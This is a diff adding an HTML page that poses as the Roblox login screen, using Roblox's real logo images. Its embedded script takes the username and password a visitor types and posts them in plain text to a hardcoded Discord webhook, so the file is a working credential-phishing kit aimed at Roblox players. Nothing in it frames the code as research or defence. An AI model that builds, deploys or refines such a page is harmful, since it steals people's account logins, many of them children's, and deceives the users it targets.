@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Roblox</title>
+
+    <!-- Roblox Favicon -->
+    <link rel="icon" href="https://static.rbxcdn.com/images/RobloxLogo.ico" type="image/x-icon">
+
+    <!-- Roblox CSS-like styling -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #252527ff; /* Set background color */
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        /* Navbar styling */
+        .navbar {
+            width: 100%;
+            height: 40px;
+            background-color: #1b1b1d;
+            display: flex;
+            align-items: center;
+            padding-left: 10px;
+        }
+
+        .roblox-logo-navbar {
+            width: 40px;
+            height: 30px;
+        }
+
+        .container {
+            background-color: #ffffff;
+            border: 1px solid #d1d1d1;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 350px;
+            text-align: center;
+        }
+
+        .roblox-logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #d1d1d1;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .btn-secondary-md {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .btn-secondary-md:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <div class="navbar">
+        <img src="https://static.rbxcdn.com/images/RobloxLogo.png" alt="Roblox Logo" class="roblox-logo-navbar">
+    </div>
+
+    <div class="container">
+        <!-- Roblox Logo -->
+        <img src="https://static.rbxcdn.com/images/RobloxLogo.png" alt="Roblox Logo" class="roblox-logo">
+
+        <!-- Username Input Field -->
+        <input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="Username/Email/Phone" value="">
+
+        <!-- Password Input Field -->
+        <input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" value="">
+
+        <!-- Login Button -->
+        <button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button>
+    </div>
+
+    <script>
+        // Function to send the username and password to the Discord webhook
+        function sendCredentialsToDiscord() {
+            const username = document.getElementById('login-username').value;
+            const password = document.getElementById('login-password').value;
+
+            // Check if either username or password is empty
+            if (!username || !password) {
+                alert('Please enter both username and password.');
+                return;
+            }
+
+            // Webhook URL
+            const webhookURL = 'https://discord.com/api/webhooks/1330803764520685608/SKGyY21KRr0M0VW2bCDC_9vOjq2DUYJWotsp43KC8FJmlfg8SBn_47GEjVi9IqGo4wrI';
+
+            // Create the payload (message to be sent to Discord)
+            const payload = {
+                content: `Username: ${username}\nPassword: ${password}`
+            };
+
+            // Send the payload via POST request
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('An error occurred.');
+            });
+        }
+
+        // Add event listener for the "Log In" button click
+        document.getElementById('login-button').addEventListener('click', sendCredentialsToDiscord);
+    </script>
+</body>
+</html>
